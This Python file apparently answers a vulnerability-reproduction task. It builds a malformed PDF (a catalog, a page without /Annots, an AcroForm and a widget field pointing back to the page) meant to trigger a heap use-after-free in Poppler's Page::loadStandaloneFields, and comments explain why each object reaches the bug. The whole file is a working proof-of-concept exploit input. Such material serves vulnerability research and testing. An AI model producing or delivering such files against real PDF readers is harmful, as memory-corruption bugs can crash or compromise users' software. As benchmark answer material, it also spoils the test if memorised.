import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Arvo (Poppler).
        The vulnerability is located in Page::loadStandaloneFields where a Dict is passed to
        an Object constructor without incrementing the reference count, leading to a premature free.
        """
        
        # PDF Header
        header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
        
        # We will construct the objects and calculate offsets for the XREF table
        # Structure:
        # 1: Catalog (References Pages and AcroForm)
        # 2: Pages (References Page)
        # 3: Page (References Parent, NO Annots to trigger standalone logic)
        # 4: AcroForm (References Fields, NeedAppearances)
        # 5: Field (Widget, References Page via P)
        
        objects = []
        
        def add_obj(oid, content):
            objects.append((oid, content))
            
        # 1. Catalog
        add_obj(1, b"<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R >>")
        
        # 2. Pages
        add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        
        # 3. Page
        # Note: Absence of /Annots is critical. When the Form loads, it scans AcroForm fields.
        # It finds a field pointing to this page. Since it's not in Annots, it treats it as standalone.
        # This path triggers the vulnerable loadStandaloneFields function.
        add_obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] >>")
        
        # 4. AcroForm
        # The dictionary that will be prematurely freed due to ref counting bug.
        add_obj(4, b"<< /Fields [5 0 R] /NeedAppearances true /DA (/Helv 0 Tf 0 g) >>")
        
        # 5. Widget / Field
        # Points to Page 3 via /P.
        add_obj(5, b"<< /Type /Annot /Subtype /Widget /Rect [100 100 200 200] /FT /Tx /T (Pwn) /P 3 0 R >>")
        
        # Build Body and XREF
        body = b""
        xrefs = [f"{0:010} 65535 f \n"] # Entry 0
        
        current_offset = len(header)
        
        for oid, content in objects:
            # Construct object entry
            obj_data = f"{oid} 0 obj\n".encode('latin1') + content + b"\nendobj\n"
            
            # Record offset for this object ID
            xrefs.append(f"{current_offset:010} 00000 n \n")
            
            # Append to body
            body += obj_data
            current_offset += len(obj_data)
            
        # Construct XREF Section
        xref_section = b"xref\n"
        xref_section += f"0 {len(xrefs)}\n".encode('latin1')
        xref_section += "".join(xrefs).encode('latin1')
        
        # Trailer
        trailer = f"trailer\n<< /Size {len(xrefs)} /Root 1 0 R >>\n".encode('latin1')
        
        # Startxref
        startxref = f"startxref\n{current_offset}\n%%EOF\n".encode('latin1')
        
        return header + body + xref_section + trailer + startxref